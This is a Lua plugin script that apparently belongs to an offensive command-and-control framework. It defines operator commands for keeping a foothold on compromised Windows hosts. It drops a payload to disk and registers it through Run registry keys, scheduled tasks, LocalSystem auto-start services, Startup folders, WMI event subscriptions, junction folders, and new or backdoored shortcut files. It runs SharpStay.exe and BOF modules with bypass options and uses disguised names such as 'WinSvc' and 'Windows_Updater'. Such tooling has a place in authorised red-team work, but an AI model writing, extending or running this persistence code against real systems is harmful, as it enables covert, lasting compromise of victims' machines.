local time = require("time")
local strings = require("strings")

local function bof_path(bof_name, arch)
    return "persistence/" .. bof_name .. "/" .. bof_name .. "." .. arch .. ".o"
end

local persistdefaults = {
    displayname = "WinSvc",
    regkeyname = "WinReg",
    registry_key = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    taskname = "WinTask",
    servicename = "WinSvc",
    eventname = "WinEvent",
    attime = "startup",
    lnkpath = "",
    command = "",
    droplocation = "C:\\Windows\\Temp\\Stay.exe",
    clsid = "",
    dllpath = "",
    customfile = "",
    listener = "",
    template = "",
    staged = "false",
    x86 = "false",
    findreplace = "$$PAYLOAD$$",
    shellcodeformat = "base64"
}

-- Resolve custom file content from flags: --artifact_name, --use_malefic_as_custom_file, or --custom_file
local function resolve_custom_file(cmd, session)
    local artifact_name = cmd:Flags():GetString("artifact_name")
    local use_malefic_as_custom_file = cmd:Flags():GetBool("use_malefic_as_custom_file")
    local custom_file = cmd:Flags():GetString("custom_file")

    if artifact_name ~= "" then
        return artifact_bin(session, artifact_name)
    elseif use_malefic_as_custom_file then
        return self_artifact(session)
    elseif custom_file ~= "" then
        return read(custom_file)
    else
        error("must specify --artifact_name, --custom_file, or --use_malefic_as_custom_file")
        return nil
    end
end

-- Add common custom file flags to a command
local function add_custom_file_flags(cmd)
    cmd:Flags():String("artifact_name", "", "artifact name to use as payload (tab-complete supported)")
    cmd:Flags():String("custom_file", "", "local file path to use as payload")
    cmd:Flags():Bool("use_malefic_as_custom_file", false, "use current session's artifact as payload")
    bind_flags_completer(cmd, { artifact_name = artifact_name_completer() })
end

local function run_Registry_Key(cmd, args)
    local session = active()
    local reg_key_name = cmd:Flags():GetString("reg_key_name")
    local command = cmd:Flags():GetString("command")
    local drop_location = cmd:Flags():GetString("drop_location")
    local registry_key = cmd:Flags():GetString("registry_key")

    local regkeyname
    if reg_key_name ~= "" then
        regkeyname = reg_key_name
    else
        regkeyname = persistdefaults.regkeyname
    end

    if drop_location == "" then drop_location = persistdefaults.droplocation end

    local custom_file_content = resolve_custom_file(cmd, session)
    if custom_file_content == nil then return end

    if command == "" then
        if drop_location ~= "" then
            command = drop_location
        else
            command = persistdefaults.command
        end
    end

    if drop_location ~= "" then
        uploadraw(session, custom_file_content, drop_location, "0644", false)
    end

    local hive, path
    if registry_key ~= "" then
        local parts = strings.split(registry_key,"\\")
        hive = parts[1]
        local path_parts = {}
        for i = 2, #parts do
            table.insert(path_parts, parts[i])
        end
        path = table.concat(path_parts, "\\")
    end

    return reg_add(session, hive, path, regkeyname, "REG_SZ", command)
end

local cmd_registry_key = command("persistence:Registry_Key", run_Registry_Key,
                                 "persistence via Windows Registry Key",
                                 "T1547.001")
cmd_registry_key:Flags():String("reg_key_name", persistdefaults.registry_key,
                                "Name of the registry key to create or modify")
cmd_registry_key:Flags():String("command", "",
                                "Command to execute via the registry key")
cmd_registry_key:Flags():String("drop_location", persistdefaults.droplocation,
                                "File path where payload is dropped")
cmd_registry_key:Flags():String("registry_key", persistdefaults.registry_key,
                                "Full registry key path (e.g., HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)")
add_custom_file_flags(cmd_registry_key)
-- cmd_registry_key:Flags():Bool("clean_up", false, "clean_up")

function run_scheduled_task(cmd, args)
    local taskname = cmd:Flags():GetString("taskname")
    local command = cmd:Flags():GetString("command")
    local drop_location = cmd:Flags():GetString("drop_location")
    local trigger = cmd:Flags():GetInt("trigger")
    local session = active()

    taskname = taskname ~= "" and taskname or persistdefaults.taskname

    if drop_location == "" then drop_location = persistdefaults.droplocation end

    local custom_file_content = resolve_custom_file(cmd, session)
    if custom_file_content == nil then return end

    if command == "" then
        if drop_location ~= "" then
            command = drop_location
        else
            command = persistdefaults.command
        end
    end

    if drop_location ~= "" then
        uploadraw(session, custom_file_content, drop_location, "0644", false)
    end

    return taskschd_create(session, taskname, drop_location, trigger,
                           "2023-10-10T09:00:00")
end

local cmd_scheduled_task = command("persistence:Scheduled_Task",
                                   run_scheduled_task, "persistence",
                                   "T1053.002")
cmd_scheduled_task:Flags():String("taskname", persistdefaults.taskname,
                                  "taskname")
cmd_scheduled_task:Flags():String("command", persistdefaults.command,
                                  "Command to execute via the registry key")
cmd_scheduled_task:Flags():Int("trigger", 9, "trigger")
cmd_scheduled_task:Flags():String("drop_location", persistdefaults.droplocation,
                                  "File path where payload is dropped")
add_custom_file_flags(cmd_scheduled_task)

local function run_service_install(cmd, args)
    local session = active()
    local service_name = cmd:Flags():GetString("service_name")
    local display_name = cmd:Flags():GetString("display_name")
    local drop_location = cmd:Flags():GetString("drop_location")
    local start_type = cmd:Flags():GetString("start_type")
    local error_control = cmd:Flags():GetString("error_control")
    local account_name = cmd:Flags():GetString("account_name")

    service_name = service_name ~= "" and service_name or
                       persistdefaults.servicename
    display_name = display_name ~= "" and display_name or
                       persistdefaults.displayname

    if drop_location == "" then drop_location = persistdefaults.droplocation end

    local custom_file_content = resolve_custom_file(cmd, session)
    if custom_file_content == nil then return end

    if drop_location ~= "" then
        uploadraw(session, custom_file_content, drop_location, "0644", false)
    end

    return service_create(session, service_name, display_name, drop_location,
                          start_type, error_control, account_name)
end

local cmd_service_install = command("persistence:Install_Service",
                                    run_service_install, "persistence",
                                    "T1543.003")
cmd_service_install:Flags():String("service_name", persistdefaults.servicename,
                                   "service_name")
cmd_service_install:Flags():String("display_name", persistdefaults.displayname,
                                   "Display Name of the service")
cmd_service_install:Flags():String("start_type", "AutoStart",
                                   "Type of service startup")
cmd_service_install:Flags():String("error_control", "Ignore",
                                   "Service error handling (e.g., Ignore, Normal)")
cmd_service_install:Flags():String("account_name", "LocalSystem",
                                   "account of the service")
cmd_service_install:Flags():String("drop_location",
                                   persistdefaults.droplocation,
                                   "File path where payload is dropped")
add_custom_file_flags(cmd_service_install)
cmd_service_install:Flags():String("command", persistdefaults.command,
                                   "Command to execute via the registry key")

local function run_startup_folder(cmd, args)
    local use_current_user = cmd:Flags():GetBool(
                                 "use_current_user_startupfolder")
    local filename = cmd:Flags():GetString("filename")
    local session = active()
    local username = session.Os.Username
    local drop_location

    if use_current_user then
        drop_location = "C:\\Users\\" .. username ..
                            "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" ..
                            filename
    else
        drop_location =
            "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" ..
                filename
    end

    local custom_file_content = resolve_custom_file(cmd, session)
    if custom_file_content == nil then return end

    if drop_location ~= "" then
        uploadraw(session, custom_file_content, drop_location, "0644", false)
    end
end

local cmd_startup_folder = command("persistence:startup_folder",
                                   run_startup_folder,
                                   "persistence via startup folder", "T1547.001")
cmd_startup_folder:Flags():Bool("use_current_user_startupfolder", true,
                                "use_current_user_startupfolder")
cmd_startup_folder:Flags():String("filename", "Stay.exe",
                                  "filename of executable file to be run at startup.")
add_custom_file_flags(cmd_startup_folder)

local function run_wmi_event(cmd, args)
    local session = active()
    local eventname = cmd:Flags():GetString("eventname")
    local command = cmd:Flags():GetString("command")
    local attime = cmd:Flags():GetString("attime")
    local drop_location = cmd:Flags():GetString("drop_location")

    eventname = eventname ~= "" and eventname or persistdefaults.eventname

    if drop_location == "" then drop_location = persistdefaults.droplocation end

    local custom_file_content = resolve_custom_file(cmd, session)
    if custom_file_content == nil then return end

    if command == "" then
        if drop_location ~= "" then
            command = drop_location
        else
            command = persistdefaults.command
        end
    end

    if drop_location ~= "" then
        uploadraw(session, custom_file_content, drop_location, "0644", false)
    end

    local sharpstay = "StayKit/SharpStay.exe"

    local sharp_args = {
        "action=WMIEventSub", "eventname=" .. eventname, "attime=" .. attime,
        "command=" .. command
    }
    return execute_assembly(session, script_resource(sharpstay), sharp_args,
                            true, new_bypass_all(), new_sac())
end

local cmd_wmi_event = command("persistence:WMI_Event", run_wmi_event,
                              "persistence", "T1546.003")
cmd_wmi_event:Flags()
    :String("eventname", persistdefaults.eventname, "eventname")
cmd_wmi_event:Flags():String("command", "", "Command to execute")
cmd_wmi_event:Flags():String("attime", "startup", "At Time: ")
cmd_wmi_event:Flags():String("drop_location", persistdefaults.droplocation,
                             "File path where payload is dropped")
add_custom_file_flags(cmd_wmi_event)

local function run_JunctionFolder(cmd, args)
    local session = active()
    local dllpath = cmd:Flags():GetString("dllpath")
    local guid = cmd:Flags():GetString("guid")
    local drop_location = cmd:Flags():GetString("drop_location")

    dllpath = dllpath ~= "" and dllpath or "C:\\windows\\system32\\ntdll.dll"
    guid = guid ~= "" and guid or "8d1c5b23-6907-4d3d-9da2-920b54d0753c"

    if drop_location == "" then drop_location = persistdefaults.droplocation end

    local custom_file_content = resolve_custom_file(cmd, session)
    if custom_file_content == nil then return end

    if drop_location ~= "" then
        uploadraw(session, custom_file_content, drop_location, "0644", false)
    end

    local sharp_args = {
        "action=JunctionFolder", "dllpath=" .. dllpath, "guid=" .. guid
    }

    local sharpstay = "StayKit/SharpStay.exe"
    return execute_assembly(session, script_resource(sharpstay), sharp_args,
                            true, new_bypass_all(), new_sac())
end

local cmd_junction_folder = command("persistence:Junction_Folder",
                                    run_JunctionFolder, "persistence", "")
cmd_junction_folder:Flags():String("dllpath", "", "dllpath")
cmd_junction_folder:Flags():String("guid", "", "guid")
cmd_junction_folder:Flags():String("drop_location", "", "drop_location")
add_custom_file_flags(cmd_junction_folder)

local function run_newlnk(cmd, args)
    local session = active()
    local filepath = cmd:Flags():GetString("filepath")
    local lnkname = cmd:Flags():GetString("lnkname")
    local lnktarget = cmd:Flags():GetString("lnktarget")
    local lnkicon = cmd:Flags():GetString("lnkicon")
    local command = cmd:Flags():GetString("command")
    local drop_location = cmd:Flags():GetString("drop_location")

    if drop_location == "" then drop_location = persistdefaults.droplocation end

    local custom_file_content = resolve_custom_file(cmd, session)
    if custom_file_content == nil then return end

    if command == "" then
        if drop_location ~= "" then
            command = drop_location
        else
            command = persistdefaults.command
        end
    end

    if lnktarget == "" and drop_location ~= "" then lnktarget = drop_location end

    if drop_location ~= "" then
        uploadraw(session, custom_file_content, drop_location, "0644", false)
    end

    local sharp_args = {
        "action=NewLnk", "filepath=" .. filepath, "lnkname=" .. lnkname,
        "lnktarget=" .. lnktarget, "lnkicon=" .. lnkicon, "command=" .. command
    }

    local file_path = "StayKit/SharpStay.exe"
    return execute_assembly(session, script_resource(file_path), sharp_args,
                            true, new_bypass_all(), new_sac())
end

local cmd_newlnk = command("persistence:NewLnk", run_newlnk, "persistence",
                           "T1547.009")
cmd_newlnk:Flags():String("filepath", "", "filepath")
cmd_newlnk:Flags():String("lnkname", "", "lnkname")
cmd_newlnk:Flags():String("lnktarget", "", "lnktarget")
cmd_newlnk:Flags():String("lnkicon", "", "lnkicon")
cmd_newlnk:Flags():String("command", "", "command")
cmd_newlnk:Flags():String("drop_location", "", "drop_location")
add_custom_file_flags(cmd_newlnk)

local function run_backdoorlnk(cmd, args)
    local session = active()
    local lnkpath = cmd:Flags():GetString("lnkpath")
    local command = cmd:Flags():GetString("command")
    local drop_location = cmd:Flags():GetString("drop_location")

    if lnkpath == "" then
        -- lnkpath = "C:\\users\\" .. session.Os.Username .. "\\desktop\\Excel.lnk"
        error("lnkpath is required")
        return
    end

    if drop_location == "" then drop_location = persistdefaults.droplocation end

    local custom_file_content = resolve_custom_file(cmd, session)
    if custom_file_content == nil then return end

    if command == "" then
        if drop_location ~= "" then
            command = drop_location
        else
            command = persistdefaults.command
        end
    end

    if drop_location ~= "" then
        uploadraw(session, custom_file_content, drop_location, "0644", false)
    end

    local sharp_args = {
        "action=BackdoorLnk", "lnkpath=" .. lnkpath, "command=" .. command
    }
    local file_path = "StayKit/SharpStay.exe"
    return execute_assembly(session, script_resource(file_path), sharp_args,
                            true, new_bypass_all(), new_sac())
end

local cmd_backdoorlnk = command("persistence:BackdoorLnk", run_backdoorlnk,
                                "persistence", "T1547.009")
cmd_backdoorlnk:Flags():String("lnkpath", "",
                               "The original path of the .lnk file to be replaced.")
cmd_backdoorlnk:Flags():String("command", "",
                               "The new command to be set for the .lnk file.")
cmd_backdoorlnk:Flags():String("drop_location", "",
                               "File path where payload is dropped")
add_custom_file_flags(cmd_backdoorlnk)

-- registry_key
local function run_regkey_autorun(cmd)
    local reg_key_name = cmd:Flags():GetString("reg_key_name")
    local packed_args = bof_pack("zz", reg_key_name,"self")
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("regkey", arch)
    local result = bof(session, script_resource(bof_file), packed_args, true)
    return result
end

local cmd_regkey = command("persistence:reg_key", run_regkey_autorun, "persistence by reg_key", "T1113")
cmd_regkey:Flags():String("reg_key_name","Windows_Updater","reg_key")
opsec("persistence:reg_key", 9.0)